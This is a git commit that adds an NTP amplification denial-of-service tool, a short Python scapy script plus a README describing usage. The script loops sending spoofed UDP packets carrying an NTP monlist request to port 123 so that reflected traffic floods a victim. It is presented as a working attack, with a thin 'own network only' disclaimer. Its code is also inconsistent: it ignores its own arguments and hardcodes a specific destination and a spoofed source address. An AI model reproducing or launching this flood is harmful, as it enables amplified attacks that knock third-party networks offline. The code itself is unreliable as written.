a7bbcc13aa7506b068301c79cc9b16fab0dc6c15
vpnguy <myinboxforchan@gmail.com>
2014-01-22 10:47:29 -0700

    Added the script and updated readme
    Signed-off-by: vpnguy <myinboxforchan@gmail.com>

--- README.md
+++ README.md
@@ -1,4 +1,11 @@
-ntpdos
-======
+ntpdos<br />
+Denial of service using NTP servers to amplify attacks <br />
 
-Create a DDOS attack using NTP servers
+Usage:<br />
+<b>ntpdos.py "target ip" "source ip"</b>
+<br />
+
+Example:<br />
+<b>ntpdos.py "1.2.3.4" "4.3.2.1"</b>  -  Will attempt to spoof packets to 1.2.3.4 using NTP server 4.3.2.1
+<br />
+<br />
---
+++ ntpdos.py
@@ -0,0 +1,13 @@
+#NTP Amp DOS attack
+#usage ntpdos.py <target ip> <ntpserver to attack with> ex: ntpdos.py 1.2.3.4 4.3.2.1
+#Simple But Deadly!
+#FOR USE ON YOUR OWN NETWORK ONLY
+from scapy.all import *
+import sys
+target=sys.argv[1]
+ntpserver=sys.argv[2]
+data=str("\x17\x00\x03\x2a") + str("\x00")*4
+print "Starting to flood: "+ target + " using NTP: " + ntpserver
+print "Use CTRL+C to stop attack"
+packet = IP(dst="91.237.196.20",src="1.2.3.4")/UDP(sport=48947,dport=123)/Raw(load=data)
+send(packet,loop=1)
